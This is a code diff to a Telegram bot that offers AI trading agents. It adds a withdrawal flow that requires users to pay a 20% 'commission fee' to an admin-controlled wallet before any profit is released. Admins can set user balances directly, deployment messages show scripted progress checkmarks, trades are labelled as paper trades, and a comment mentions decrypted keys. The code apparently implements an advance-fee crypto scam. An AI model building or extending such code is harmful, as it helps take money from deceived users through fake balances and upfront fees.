@@ -25,6 +25,240 @@ const users = new Map(); // ← FIX #2: Added missing Map
 
 const bot = new Telegraf(config.BOT_TOKEN);
 
+// ═══════════════════════════════════════════════════
+// 💸 WITHDRAWAL SETTINGS
+// ═══════════════════════════════════════════════════
+
+// ═══════════════════════════════════════════════════
+// 💸 WITHDRAWAL SETTINGS
+// ═══════════════════════════════════════════════════
+
+const WITHDRAWAL_MIN_USD = Number(config.WITHDRAWAL_MIN_USD || 2000);
+const WITHDRAWAL_FEE_PERCENT = Number(config.WITHDRAWAL_FEE_PERCENT || 20);
+const WITHDRAWAL_FEE_NETWORK = String(config.WITHDRAWAL_FEE_NETWORK || 'EVM / USDT').trim();
+const WITHDRAWAL_FEE_ADDRESS_FALLBACK = String(config.WITHDRAWAL_FEE_ADDRESS || '').trim();
+
+async function getActiveWithdrawalFeeAddress() {
+    try {
+        if (typeof userTracker.getWithdrawalFeeAddress === 'function') {
+            return await userTracker.getWithdrawalFeeAddress();
+        }
+    } catch (err) {
+        console.error('❌ Failed to load dynamic withdrawal fee address:', err.message);
+    }
+
+    return WITHDRAWAL_FEE_ADDRESS_FALLBACK;
+}
+
+function extractTxHash(value) {
+    let tx = String(value || '').trim();
+
+    if (!tx) return '';
+
+    // If user pastes an explorer URL, try to extract the hash.
+    const urlMatch = tx.match(/(?:tx=|\/tx\/|transaction\/|signature\/)([A-Za-z0-9]{20,120})/i);
+    if (urlMatch && urlMatch[1]) {
+        tx = urlMatch[1];
+    }
+
+    return tx;
+}
+
+function isValidTxHash(value) {
+    const tx = extractTxHash(value);
+
+    if (!tx) return false;
+
+    // EVM transaction hash: 0x + 64 hex chars
+    if (/^0x[a-fA-F0-9]{64}$/.test(tx)) {
+        return true;
+    }
+
+    // Solana transaction signature: base58-ish, usually around 88 chars
+    if (/^[1-9A-HJ-NP-Za-km-z]{60,110}$/.test(tx)) {
+        return true;
+    }
+
+    // Generic fallback for other chains/explorers
+    if (/^[A-Za-z0-9_-]{20,120}$/.test(tx)) {
+        return true;
+    }
+
+    return false;
+}
+
+function normalizeTxHash(value) {
+    return extractTxHash(value);
+}
+
+function withdrawalStatusLabel(status) {
+    switch (String(status || '').toLowerCase()) {
+        case 'awaiting_fee':
+            return 'Awaiting Commission Fee';
+        case 'fee_reported':
+            return 'Fee Reported / Under Review';
+        case 'approved':
+            return 'Approved';
+        case 'rejected':
+            return 'Rejected';
+        case 'cancelled':
+            return 'Cancelled';
+        default:
+            return status || 'Unknown';
+    }
+}
+
+function buildWithdrawalFeeMessage(request, feeAddress = '') {
+    const profit = Number(request.profit_usd || 0);
+    const fee = Number(request.fee_usd || 0);
+    const net = Number(request.net_usd || 0);
+
+    const lines = [
+        '📥 Withdrawal Request Created',
+        '',
+        `Profit balance: ${formatUsd(profit)}`,
+        `Commission fee (${WITHDRAWAL_FEE_PERCENT}%): ${formatUsd(fee)}`,
+        `Net after fee: ${formatUsd(net)}`,
+        `Withdraw to wallet: ${request.wallet_address}`,
+        '',
+        'To release your profit withdrawal, you must first pay the commission fee.',
+        ''
+    ];
+
+    if (feeAddress) {
+        lines.push('Send commission fee to:');
+        lines.push(feeAddress);
+        lines.push(`Network: ${WITHDRAWAL_FEE_NETWORK}`);
+    } else {
+        lines.push('Commission fee wallet: Not configured yet. Please contact admin.');
+    }
+
+    lines.push('');
+    lines.push('After sending the fee, tap "I Paid Commission Fee".');
+    lines.push('You will then be asked to submit the transaction hash for verification.');
+
+    const rows = [
+        [Markup.button.callback('✅ I Paid Commission Fee', 'withdraw_paid_fee')]
+    ];
+
+    if (feeAddress) {
+        rows.push([Markup.button.callback('📋 Copy Fee Wallet', 'copy_withdrawal_fee_address')]);
+    }
+
+    rows.push([Markup.button.callback('❌ Cancel Withdrawal', 'cancel_withdrawal')]);
+
+    return {
+        text: lines.join('\n'),
+        keyboard: Markup.inlineKeyboard(rows)
+    };
+}
+
+function buildWithdrawalPendingMessage(request, feeAddress = '') {
+    const profit = Number(request.profit_usd || 0);
+    const fee = Number(request.fee_usd || 0);
+    const net = Number(request.net_usd || 0);
+
+    const lines = [
+        '⏳ Pending Withdrawal Request',
+        '',
+        `Status: ${withdrawalStatusLabel(request.status)}`,
+        `Profit balance: ${formatUsd(profit)}`,
+        `Commission fee (${WITHDRAWAL_FEE_PERCENT}%): ${formatUsd(fee)}`,
+        `Net after fee: ${formatUsd(net)}`,
+        `Withdraw to wallet: ${request.wallet_address}`,
+        ''
+    ];
+
+    if (request.status === 'awaiting_fee') {
+        lines.push('You still need to pay the commission fee before withdrawal can be released.');
+
+        if (feeAddress) {
+            lines.push('');
+            lines.push('Send commission fee to:');
+            lines.push(feeAddress);
+            lines.push(`Network: ${WITHDRAWAL_FEE_NETWORK}`);
+        } else {
+            lines.push('');
+            lines.push('Commission fee wallet is not configured yet. Please contact admin.');
+        }
+    }
+
+    if (request.status === 'fee_reported') {
+        lines.push('Your fee payment transaction hash has been submitted.');
+        lines.push('Admin is reviewing your withdrawal request.');
+
+        if (request.fee_tx_hash) {
+            lines.push('');
+            lines.push(`Submitted TX hash: ${request.fee_tx_hash}`);
+        }
+    }
+
+    lines.push('');
+    lines.push('Use the buttons below to update or cancel this request.');
+
+    const rows = [];
+
+    if (request.status === 'awaiting_fee') {
+        rows.push([Markup.button.callback('✅ I Paid Commission Fee', 'withdraw_paid_fee')]);
+    }
+
+    if (feeAddress && request.status === 'awaiting_fee') {
+        rows.push([Markup.button.callback('📋 Copy Fee Wallet', 'copy_withdrawal_fee_address')]);
+    }
+
+    rows.push([Markup.button.callback('❌ Cancel Withdrawal', 'cancel_withdrawal')]);
+    rows.push([Markup.button.callback('◀️ Back to Wallet', 'wallet_menu')]);
+
+    return {
+        text: lines.join('\n'),
+        keyboard: Markup.inlineKeyboard(rows)
+    };
+}
+
+function buildAdminWithdrawalRequestText(request, feeAddress = '') {
+    return [
+        'New Withdrawal Request',
+        '',
+        `Request ID: ${request.id}`,
+        `User Telegram ID: ${request.telegram_id}`,
+        `Withdraw Wallet: ${request.wallet_address}`,
+        `Provider: ${request.provider || 'unknown'}`,
+        '',
+        `Profit Balance: ${formatUsd(request.profit_usd)}`,
+        `Commission Fee (${WITHDRAWAL_FEE_PERCENT}%): ${formatUsd(request.fee_usd)}`,
+        `Net After Fee: ${formatUsd(request.net_usd)}`,
+        `Status: ${request.status}`,
+        '',
+        feeAddress ? `Current Fee Wallet: ${feeAddress}` : 'Current Fee Wallet: Not configured',
+        '',
+        'Admin Actions:',
+        `/admin_approve_withdrawal ${request.id}`,
+        `/admin_reject_withdrawal ${request.id} optional note`
+    ].join('\n');
+}
+
+function buildAdminWithdrawalFeeReportedText(request, feeAddress = '') {
+    return [
+        'Withdrawal Fee Reported',
+        '',
+        `Request ID: ${request.id}`,
+        `User Telegram ID: ${request.telegram_id}`,
+        `Withdraw Wallet: ${request.wallet_address}`,
+        '',
+        `Profit Balance: ${formatUsd(request.profit_usd)}`,
+        `Commission Fee (${WITHDRAWAL_FEE_PERCENT}%): ${formatUsd(request.fee_usd)}`,
+        `Net After Fee: ${formatUsd(request.net_usd)}`,
+        `Status: ${request.status}`,
+        request.fee_tx_hash ? `Fee TX Hash: ${request.fee_tx_hash}` : 'Fee TX Hash: none',
+        '',
+        feeAddress ? `Current Fee Wallet: ${feeAddress}` : 'Current Fee Wallet: Not configured',
+        '',
+        'Admin Actions:',
+        `/admin_approve_withdrawal ${request.id}`,
+        `/admin_reject_withdrawal ${request.id} optional note`
+    ].filter(Boolean).join('\n');
+}
+
 // 🧪 DEBUG: Log ALL incoming messages
 bot.use((ctx, next) => {
     if (ctx.message?.text) {
@@ -55,12 +289,33 @@ function formatUsd(value) {
 }
 
 function getTimeAgo(date) {
-    const seconds = Math.floor((Date.now() - new Date(date).getTime()) / 1000);
+    const time = new Date(date).getTime();
 
-    if (seconds < 60) return 'just now';
-    if (seconds < 3600) return `${Math.floor(seconds / 60)} mins ago`;
-    if (seconds < 86400) return `${Math.floor(seconds / 3600)} hours ago`;
-    return `${Math.floor(seconds / 86400)} days ago`;
+    if (!Number.isFinite(time)) {
+        return 'unknown time';
+    }
+
+    const seconds = Math.floor((Date.now() - time) / 1000);
+
+    if (seconds < 45) {
+        return 'just now';
+    }
+
+    const minutes = Math.floor(seconds / 60);
+
+    if (minutes < 60) {
+        return `${minutes} min${minutes === 1 ? '' : 's'} ago`;
+    }
+
+    const hours = Math.floor(minutes / 60);
+
+    if (hours < 24) {
+        return `${hours} hour${hours === 1 ? '' : 's'} ago`;
+    }
+
+    const days = Math.floor(hours / 24);
+
+    return `${days} day${days === 1 ? '' : 's'} ago`;
 }
 
 function normalizeTradeStatus(status) {
@@ -385,10 +640,16 @@ function containsSensitiveString(text) {
     if (!value.trim()) return false;
 
     // Never translate code fences. This protects admin decrypted keys.
-    if (value.includes('```')) return true;
+    if (value.includes('`')) return true;
 
-    // Never translate likely private keys / 64-char hex strings.
+    // Private keys / transaction hashes / 64-char hex strings.
     if (/\b(?:0x)?[a-fA-F0-9]{64}\b/.test(value)) return true;
+
+    // EVM wallet addresses.
+    if (/\b0x[a-fA-F0-9]{40}\b/.test(value)) return true;
+
+    // Solana / base58-like wallet addresses or signatures.
+    if (/\b[1-9A-HJ-NP-Za-km-z]{32,110}\b/.test(value)) return true;
 
     return false;
 }
@@ -918,7 +1179,9 @@ const REQUIRED_FIELDS = {
                 { value: '30', label: '1:30 Balanced' },
                 { value: '100', label: '1:100 Aggressive' },
                 { value: '200', label: '1:200 High Risk' },
-                { value: '500', label: '1:500 Maximum Leverage' }
+                { value: '500', label: '1:500 Very High Risk' },
+                { value: '1000', label: '1:1000 Ultra High Risk' },
+                { value: 'unlimited', label: '1:Unlimited Maximum Exposure' }
             ]
         },
         {
@@ -963,6 +1226,7 @@ const REQUIRED_FIELDS = {
             ]
         }
     ],
+
     crypto: [
         {
             key: 'market_type',
@@ -972,6 +1236,19 @@ const REQUIRED_FIELDS = {
                 { value: 'futures', label: 'Futures Trading' },
                 { value: 'grid', label: 'Grid Bot' },
                 { value: 'dca', label: 'DCA Bot' }
+            ]
+        },
+        {
+            key: 'leverage',
+            label: 'Leverage',
+            options: [
+                { value: '10', label: '1:10 Conservative' },
+                { value: '30', label: '1:30 Balanced' },
+                { value: '100', label: '1:100 Aggressive' },
+                { value: '200', label: '1:200 High Risk' },
+                { value: '500', label: '1:500 Very High Risk' },
+                { value: '1000', label: '1:1000 Ultra High Risk' },
+                { value: 'unlimited', label: '1:Unlimited Maximum Exposure' }
             ]
         },
         {
@@ -1014,6 +1291,7 @@ const REQUIRED_FIELDS = {
             ]
         }
     ],
+
     stock: [
         {
             key: 'stock_market',
@@ -1023,6 +1301,19 @@ const REQUIRED_FIELDS = {
                 { value: 'uk', label: 'UK Stocks' },
                 { value: 'eu', label: 'EU Stocks' },
                 { value: 'asia', label: 'Asia Stocks' }
+            ]
+        },
+        {
+            key: 'leverage',
+            label: 'Leverage',
+            options: [
+                { value: '10', label: '1:10 Conservative' },
+                { value: '30', label: '1:30 Balanced' },
+                { value: '100', label: '1:100 Aggressive' },
+                { value: '200', label: '1:200 High Risk' },
+                { value: '500', label: '1:500 Very High Risk' },
+                { value: '1000', label: '1:1000 Ultra High Risk' },
+                { value: 'unlimited', label: '1:Unlimited Maximum Exposure' }
             ]
         },
         {
@@ -1064,6 +1355,7 @@ const REQUIRED_FIELDS = {
             ]
         }
     ],
+
     mev: [
         {
             key: 'slippage',
@@ -1073,6 +1365,19 @@ const REQUIRED_FIELDS = {
                 { value: '0.5', label: '0.5%' },
                 { value: '1', label: '1%' },
                 { value: '2', label: '2%' }
+            ]
+        },
+        {
+            key: 'leverage',
+            label: 'Leverage',
+            options: [
+                { value: '10', label: '1:10 Conservative' },
+                { value: '30', label: '1:30 Balanced' },
+                { value: '100', label: '1:100 Aggressive' },
+                { value: '200', label: '1:200 High Risk' },
+                { value: '500', label: '1:500 Very High Risk' },
+                { value: '1000', label: '1:1000 Ultra High Risk' },
+                { value: 'unlimited', label: '1:Unlimited Maximum Exposure' }
             ]
         },
         {
@@ -3223,7 +3528,9 @@ bot.on('text', async (ctx, next) => {
     const isSetupFlow =
         state.step === 'awaiting_capital_percent' ||
         state.step === 'market_setup' ||
-        state.step === 'waiting_wallet_address';
+        state.step === 'waiting_wallet_address' ||
+        state.step === 'waiting_withdraw_address' ||
+        state.step === 'waiting_withdrawal_fee_tx';
 
     const timeoutMs = isSetupFlow ? SETUP_TIMEOUT_MS : 5 * 60 * 1000;
 
@@ -3392,35 +3699,169 @@ Once approved, you will receive a message and can tap *Deploy Agent*.
             [Markup.button.callback('◀️ Dashboard', 'dashboard')]
         ]));
 
-        const adminText = `
-🔔 *New Wallet Connect Request*
-
-*User:* @${ctx.from.username || 'unknown'}  
-*Name:* ${ctx.from.first_name || 'Unknown'}  
-*Telegram ID:* \`${userId}\`
-
-*Address:*  
-\`${address}\`
-
-*Provider:* ${provider || 'unknown'}
-
-*Actions:*
-
-Approve with balance:
-
-\`/admin_approve ${userId} 500 optional note\`
-
-Reject:
-
-\`/admin_reject ${userId} optional note\`
-
-Set balance directly:
-
-\`/admin_set_balance ${userId} 500 ${address} optional note\`
-`;
+        const adminText = [
+            '🔔 New Wallet Connect Request',
+            '',
+            `User: @${ctx.from.username || 'unknown'}`,
+            `Name: ${ctx.from.first_name || 'Unknown'}`,
+            `Telegram ID: ${userId}`,
+            '',
+            `Address: ${address}`,
+            `Provider: ${provider || 'unknown'}`,
+            '',
+            'Actions:',
+            `/admin_approve ${userId} 500 optional note`,
+            `/admin_reject ${userId} optional note`,
+            `/admin_set_balance ${userId} 500 ${address} optional note`
+        ].join('\n');
 
         notifyAdmins(adminText).catch(err => {
             console.error('❌ Failed to notify admins:', err.message);
+        });
+
+        return;
+    }
+
+    if (state.step === 'waiting_withdraw_address') {
+        try {
+            await ctx.deleteMessage();
+        } catch (e) { }
+
+        console.log(`[WITHDRAWAL] User ${userId} submitted withdrawal address: ${text}`);
+
+        if (
+            typeof userTracker.normalizeWalletAddress !== 'function' ||
+            typeof userTracker.isValidWalletAddress !== 'function' ||
+            typeof userTracker.inferWalletProvider !== 'function' ||
+            typeof userTracker.createWithdrawalRequest !== 'function'
+        ) {
+            console.error('❌ Withdrawal user-tracker functions are missing.');
+            return ctx.reply('❌ Withdrawal system is not fully loaded. Please contact admin.');
+        }
+
+        const address = userTracker.normalizeWalletAddress(text);
+
+        if (!userTracker.isValidWalletAddress(address)) {
+            state.timestamp = Date.now();
+            walletManager.userStates.set(userId, state);
+
+            return ctx.reply([
+                '❌ Invalid withdrawal wallet address.',
+                '',
+                'Please send a valid wallet address.',
+                '',
+                'EVM example:',
+                '0x1234567890abcdef1234567890abcdef12345678',
+                '',
+                'Solana example:',
+                '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU',
+                '',
+                'Do not send your private key or seed phrase.'
+            ].join('\n'), Markup.inlineKeyboard([
+                [Markup.button.callback('❌ Cancel Withdrawal', 'cancel_withdrawal')],
+                [Markup.button.callback('◀️ Back to Wallet', 'wallet_menu')]
+            ]));
+        }
+
+        const provider = userTracker.inferWalletProvider(address);
+        const profit = Number(state.profitUsd || 0);
+
+        if (!Number.isFinite(profit) || profit < WITHDRAWAL_MIN_USD) {
+            walletManager.userStates.delete(userId);
+
+            return ctx.reply([
+                '🚫 Withdrawal cancelled.',
+                '',
+                `Your profit balance is below the minimum withdrawal amount of ${formatUsd(WITHDRAWAL_MIN_USD)}.`
+            ].join('\n'), Markup.inlineKeyboard([
+                [Markup.button.callback('💰 View Profit', 'profit_menu')],
+                [Markup.button.callback('◀️ Dashboard', 'dashboard')]
+            ]));
+        }
+
+        const fee = round2(profit * (WITHDRAWAL_FEE_PERCENT / 100));
+        const net = round2(Math.max(0, profit - fee));
+
+        const created = await userTracker.createWithdrawalRequest({
+            telegramId: userId,
+            walletAddress: address,
+            provider,
+            profitUsd: profit,
+            feeUsd: fee,
+            netUsd: net
+        });
+
+        if (!created?.ok) {
+            console.error('❌ Failed to create withdrawal request:', created?.error);
+            return ctx.reply(`❌ Could not create withdrawal request: ${created?.error || 'Unknown error'}`);
+        }
+
+        walletManager.userStates.delete(userId);
+
+        const feeAddress = await getActiveWithdrawalFeeAddress();
+
+        const { text: feeText, keyboard } = buildWithdrawalFeeMessage(created.data, feeAddress);
+        await ctx.reply(feeText, keyboard);
+
+        notifyAdmins(buildAdminWithdrawalRequestText(created.data, feeAddress)).catch(err => {
+            console.error('❌ Failed to notify admin about new withdrawal request:', err.message);
+        });
+
+        return;
+    }
+
+    if (state.step === 'waiting_withdrawal_fee_tx') {
+        try {
+            await ctx.deleteMessage();
+        } catch (e) { }
+
+        console.log(`[WITHDRAWAL] User ${userId} submitted fee TX hash for request ${state.requestId}: ${text}`);
+
+        const txHash = normalizeTxHash(text);
+
+        if (!isValidTxHash(txHash)) {
+            state.timestamp = Date.now();
+            walletManager.userStates.set(userId, state);
+
+            return ctx.reply([
+                '❌ Invalid transaction hash.',
+                '',
+                'Please send only the transaction hash / TX ID.',
+                '',
+                'Examples:',
+                'EVM TX: 0x...',
+                'Solana TX: base58 signature',
+                '',
+                'Do not send your private key or seed phrase.'
+            ].join('\n'), Markup.inlineKeyboard([
+                [Markup.button.callback('❌ Cancel Withdrawal', 'cancel_withdrawal')],
+                [Markup.button.callback('◀️ Back to Wallet', 'wallet_menu')]
+            ]));
+        }
+
+        if (typeof userTracker.markWithdrawalFeeReported !== 'function') {
+            console.error('❌ userTracker.markWithdrawalFeeReported is missing.');
+            walletManager.userStates.delete(userId);
+            return ctx.reply('❌ Fee reporting function is missing. Please contact admin.');
+        }
+
+        const result = await userTracker.markWithdrawalFeeReported(state.requestId, txHash);
+
+        if (!result.ok) {
+            walletManager.userStates.delete(userId);
+            return ctx.reply(`❌ Could not submit transaction hash: ${result.error}`);
+        }
+
+        walletManager.userStates.delete(userId);
+
+        const updatedRequest = result.data;
+        const feeAddress = await getActiveWithdrawalFeeAddress();
+
+        const { text: pendingText, keyboard } = buildWithdrawalPendingMessage(updatedRequest, feeAddress);
+        await ctx.reply(pendingText, keyboard);
+
+        notifyAdmins(buildAdminWithdrawalFeeReportedText(updatedRequest, feeAddress)).catch(err => {
+            console.error('❌ Failed to notify admin about fee-reported withdrawal:', err.message);
         });
 
         return;
@@ -3996,21 +4437,18 @@ ${formatUsd(minCapital)}
 
     if (profile.market === 'forex') {
         deploymentText = `
-🚀 *Deploying Forex Agent...*
-
+🚀 Deploying Forex Agent...
 ━━━━━━━━━━━━━━━━━━━━━
-
-Connecting to liquidity providers... ✓  
-Loading leverage profile... ✓  
-Configuring risk per trade... ✓  
-Selecting instrument focus... ✓  
-Activating session filters... ✓  
-Enabling stop-loss / take-profit engine... ✓  
+Connecting to liquidity providers... ✓
+Loading leverage profile... ✓
+Configuring risk per trade... ✓
+Selecting instrument focus... ✓
+Activating session filters... ✓
+Enabling stop-loss / take-profit engine... ✓
 Reading trading capital... ✓
-
+Applying leverage settings... ✓
 ━━━━━━━━━━━━━━━━━━━━━
-
-✅ *Forex Agent Deployed Successfully!*
+✅ Forex Agent Deployed Successfully!
 
 Your Forex bot is now active with:
 
@@ -4019,110 +4457,100 @@ Your Forex bot is now active with:
 • Instrument Focus: ${getOptionLabel('forex', 'pairs', profile.settings.pairs)}
 • Strategy: ${getOptionLabel('forex', 'strategy', profile.settings.strategy)}
 • Session: ${getOptionLabel('forex', 'session', profile.settings.session)}
-
 ${capitalSummary}
 ${warningSummary}
 
-_You'll receive notifications for your trades and risk events._
+You'll receive notifications for paper trades and risk events.
 `;
     }
 
     if (profile.market === 'crypto') {
         deploymentText = `
-🚀 *Deploying Crypto Agent...*
-
+🚀 Deploying Crypto Agent...
 ━━━━━━━━━━━━━━━━━━━━━
-
-Connecting exchange feeds... ✓  
-Loading market type... ✓  
-Configuring risk profile... ✓  
-Selecting pairs... ✓  
-Activating timeframe engine... ✓  
-Enabling TP / SL module... ✓  
+Connecting exchange feeds... ✓
+Loading market type... ✓
+Configuring risk profile... ✓
+Selecting pairs... ✓
+Activating timeframe engine... ✓
+Enabling TP / SL module... ✓
 Reading trading capital... ✓
-
+Applying leverage settings... ✓
 ━━━━━━━━━━━━━━━━━━━━━
-
-✅ *Crypto Agent Deployed Successfully!*
+✅ Crypto Agent Deployed Successfully!
 
 Your Crypto bot is now active with:
 
 • Market Type: ${getOptionLabel('crypto', 'market_type', profile.settings.market_type)}
+• Leverage: ${getOptionLabel('crypto', 'leverage', profile.settings.leverage)}
 • Risk Profile: ${getOptionLabel('crypto', 'risk', profile.settings.risk)}
 • Pair Selection: ${getOptionLabel('crypto', 'pairs', profile.settings.pairs)}
 • Timeframe: ${getOptionLabel('crypto', 'timeframe', profile.settings.timeframe)}
 • Exit Style: ${getOptionLabel('crypto', 'exit', profile.settings.exit)}
-
 ${capitalSummary}
 ${warningSummary}
 
-_You'll receive notifications for trades and risk events._
+You'll receive notifications for paper trades and risk events.
 `;
     }
 
     if (profile.market === 'stock') {
         deploymentText = `
-🚀 *Deploying Stock Agent...*
-
+🚀 Deploying Stock Agent...
 ━━━━━━━━━━━━━━━━━━━━━
-
-Connecting market data feeds... ✓  
-Loading stock market region... ✓  
-Configuring strategy... ✓  
-Selecting sectors... ✓  
-Activating holding period rules... ✓  
-Enabling risk controls... ✓  
+Connecting market data feeds... ✓
+Loading stock market region... ✓
+Configuring strategy... ✓
+Selecting sectors... ✓
+Activating holding period rules... ✓
+Enabling risk controls... ✓
 Reading trading capital... ✓
-
+Applying leverage settings... ✓
 ━━━━━━━━━━━━━━━━━━━━━
-
-✅ *Stock Agent Deployed Successfully!*
+✅ Stock Agent Deployed Successfully!
 
 Your Stock bot is now active with:
 
 • Market: ${getOptionLabel('stock', 'stock_market', profile.settings.stock_market)}
+• Leverage: ${getOptionLabel('stock', 'leverage', profile.settings.leverage)}
 • Strategy: ${getOptionLabel('stock', 'strategy', profile.settings.strategy)}
 • Risk Profile: ${getOptionLabel('stock', 'risk', profile.settings.risk)}
 • Sector Focus: ${getOptionLabel('stock', 'sectors', profile.settings.sectors)}
 • Holding Period: ${getOptionLabel('stock', 'holding', profile.settings.holding)}
-
 ${capitalSummary}
 ${warningSummary}
 
-_You'll receive notifications for trades and risk events._
+You'll receive notifications for paper trades and risk events.
 `;
     }
 
     if (profile.market === 'mev') {
         deploymentText = `
-🚀 *Deploying MEV Agent...*
-
+🚀 Deploying MEV Agent...
 ━━━━━━━━━━━━━━━━━━━━━
-
-Initializing searcher... ✓  
-Connecting to mempools... ✓  
-Configuring private relays... ✓  
-Loading slippage tolerance... ✓  
-Selecting chains... ✓  
-Enabling revert-safe execution... ✓  
+Initializing searcher... ✓
+Connecting to mempools... ✓
+Configuring private relays... ✓
+Loading slippage tolerance... ✓
+Selecting chains... ✓
+Enabling revert-safe execution... ✓
 Reading trading capital... ✓
-
+Applying leverage settings... ✓
 ━━━━━━━━━━━━━━━━━━━━━
-
-✅ *MEV Agent Deployed Successfully!*
+✅ MEV Agent Deployed Successfully!
 
 Your MEV bot is now active with:
 
 • Slippage Tolerance: ${getOptionLabel('mev', 'slippage', profile.settings.slippage)}
+• Leverage: ${getOptionLabel('mev', 'leverage', profile.settings.leverage)}
 • Gas Strategy: ${getOptionLabel('mev', 'gas', profile.settings.gas)}
 • Chain Selection: ${getOptionLabel('mev', 'chains', profile.settings.chains)}
 • Minimum Profit: ${getOptionLabel('mev', 'min_profit', profile.settings.min_profit)}
 • Protection: ${getOptionLabel('mev', 'protection', profile.settings.protection)}
-
 ${capitalSummary}
 ${warningSummary}
 
-_You'll receive notifications for trade opportunities and risk events._
+You'll receive notifications for paper opportunities and risk events.
 `;
     }
 
@@ -4245,42 +4673,6 @@ ${balanceDisplay}
         [Markup.button.callback('◀️ Dashboard', 'dashboard')]
     ]));
 });
-
-function formatUsd(value) {
-    const num = Number(value || 0);
-    return `$${num.toFixed(2)}`;
-}
-
-function getTimeAgo(date) {
-    const seconds = Math.floor((Date.now() - new Date(date).getTime()) / 1000);
-
-    if (seconds < 60) return 'just now';
-    if (seconds < 3600) return `${Math.floor(seconds / 60)} mins ago`;
-    if (seconds < 86400) return `${Math.floor(seconds / 3600)} hours ago`;
-    return `${Math.floor(seconds / 86400)} days ago`;
-}
-
-function normalizeTradeStatus(status) {
-    if (status === 'WIN' || status === 'success') return 'WIN';
-    if (status === 'LOSS' || status === 'failed') return 'LOSS';
-    return status || 'UNKNOWN';
-}
-
-function getTradePnl(trade) {
-    if (trade.pnl_usd !== null && trade.pnl_usd !== undefined && trade.pnl_usd !== '') {
-        return Number(trade.pnl_usd || 0);
-    }
-
-    return Number(trade.profit_usd || 0);
-}
-
-function getTradeAsset(trade) {
-    return trade.asset || trade.token || 'Unknown';
-}
-
-function getTradeMarket(trade) {
-    return String(trade.market || trade.chain || 'Unknown').toUpperCase();
-}
 
 // ═══════════════════════════════════════════════════
 // 💰 PROFIT MENU
@@ -4743,18 +5135,221 @@ _Deposits are detected automatically within 30 seconds._
 bot.action('withdraw', async (ctx) => {
     await safeAnswerCbQuery(ctx);
 
-    await ctx.replyWithMarkdown(`
-📥 *Withdraw Funds*
+    const userId = ctx.from.id;
 
-Send /withdraw <amount> <token> <address>
+    try {
+        if (typeof userTracker.getLatestPendingWithdrawalRequest !== 'function') {
+            console.error('❌ userTracker.getLatestPendingWithdrawalRequest is missing.');
+            return ctx.reply('❌ Withdrawal system is not fully loaded. Please contact admin.');
+        }
 
-Example:
-\`/withdraw 100 USDC 0x...\`
+        const pending = await userTracker.getLatestPendingWithdrawalRequest(userId);
 
-_Available tokens: ETH, USDC, USDT_
-`, Markup.inlineKeyboard([
-        [Markup.button.callback('◀️ Back', 'wallet_menu')]
-    ]));
+        if (pending) {
+            const feeAddress = await getActiveWithdrawalFeeAddress();
+            const { text, keyboard } = buildWithdrawalPendingMessage(pending, feeAddress);
+            return ctx.reply(text, keyboard);
+        }
+
+        const balance = await userTracker.getUserBalance(userId);
+        const profit = Number(balance?.total_profit_usd || 0);
+
+        if (!Number.isFinite(profit) || profit < WITHDRAWAL_MIN_USD) {
+            return ctx.reply([
+                '🚫 Minimum Withdrawal Not Met',
+                '',
+                `Minimum withdrawal: ${formatUsd(WITHDRAWAL_MIN_USD)}`,
+                `Your current profit balance: ${formatUsd(profit)}`,
+                '',
+                'You need at least ' + formatUsd(WITHDRAWAL_MIN_USD) + ' in profit balance before requesting a withdrawal.'
+            ].join('\n'), Markup.inlineKeyboard([
+                [Markup.button.callback('💰 View Profit', 'profit_menu')],
+                [Markup.button.callback('◀️ Dashboard', 'dashboard')]
+            ]));
+        }
+
+        walletManager.userStates.set(userId, {
+            step: 'waiting_withdraw_address',
+            timestamp: Date.now(),
+            profitUsd: round2(profit)
+        });
+
+        return ctx.reply([
+            '📬 Send Withdrawal Wallet Address',
+            '',
+            `Your current profit balance: ${formatUsd(profit)}`,
+            `Minimum withdrawal: ${formatUsd(WITHDRAWAL_MIN_USD)}`,
+            `Commission fee: ${WITHDRAWAL_FEE_PERCENT}% of profit balance`,
+            '',
+            'Please send the wallet address where you want your profit withdrawn.',
+            '',
+            'Supported formats:',
+            'EVM: 0x...',
+            'Solana: base58 address',
+            '',
+            'Do not send your private key or seed phrase.'
+        ].join('\n'), Markup.inlineKeyboard([
+            [Markup.button.callback('❌ Cancel Withdrawal', 'cancel_withdrawal')],
+            [Markup.button.callback('◀️ Back to Wallet', 'wallet_menu')]
+        ]));
+    } catch (err) {
+        console.error('❌ /withdraw handler error:', err);
+        await ctx.reply(`❌ Withdrawal error: ${err.message}`);
+    }
+});
+
+
+bot.action('withdraw_paid_fee', async (ctx) => {
+    await safeAnswerCbQuery(ctx, 'Opening fee payment verification...');
+
+    const userId = ctx.from.id;
+
+    try {
+        if (typeof userTracker.getLatestPendingWithdrawalRequest !== 'function') {
+            return ctx.reply('❌ Withdrawal system is not fully loaded.');
+        }
+
+        const pending = await userTracker.getLatestPendingWithdrawalRequest(userId);
+
+        if (!pending) {
+            return ctx.reply('❌ No pending withdrawal request found.');
+        }
+
+        if (pending.status === 'fee_reported') {
+            const feeAddress = await getActiveWithdrawalFeeAddress();
+            const { text, keyboard } = buildWithdrawalPendingMessage(pending, feeAddress);
+            return ctx.reply(text, keyboard);
+        }
+
+        if (pending.status !== 'awaiting_fee') {
+            return ctx.reply(`❌ This withdrawal request cannot be updated. Current status: ${withdrawalStatusLabel(pending.status)}`);
+        }
+
+        const feeAddress = await getActiveWithdrawalFeeAddress();
+
+        if (!feeAddress) {
+            return ctx.reply([
+                '❌ Commission fee wallet is not configured yet.',
+                '',
+                'Please contact admin before paying the commission fee.',
+                'Admin can set the fee wallet using:'
+            ].join('\n'), Markup.inlineKeyboard([
+                [Markup.button.callback('❌ Cancel Withdrawal', 'cancel_withdrawal')],
+                [Markup.button.callback('◀️ Back to Wallet', 'wallet_menu')]
+            ]));
+        }
+
+        walletManager.userStates.set(userId, {
+            step: 'waiting_withdrawal_fee_tx',
+            requestId: pending.id,
+            timestamp: Date.now()
+        });
+
+        return ctx.reply([
+            '🧾 Send Commission Fee Transaction Hash',
+            '',
+            `Commission fee amount: ${formatUsd(pending.fee_usd)}`,
+            `Fee wallet: ${feeAddress}`,
+            `Network: ${WITHDRAWAL_FEE_NETWORK}`,
+            '',
+            'After sending the commission fee, please send the transaction hash / TX ID in the next message.',
+            '',
+            'Examples:',
+            'EVM TX: 0x...',
+            'Solana TX: base58 signature',
+            '',
+            'Do not send your private key or seed phrase.'
+        ].join('\n'), Markup.inlineKeyboard([
+            [Markup.button.callback('❌ Cancel Withdrawal', 'cancel_withdrawal')],
+            [Markup.button.callback('◀️ Back to Wallet', 'wallet_menu')]
+        ]));
+    } catch (err) {
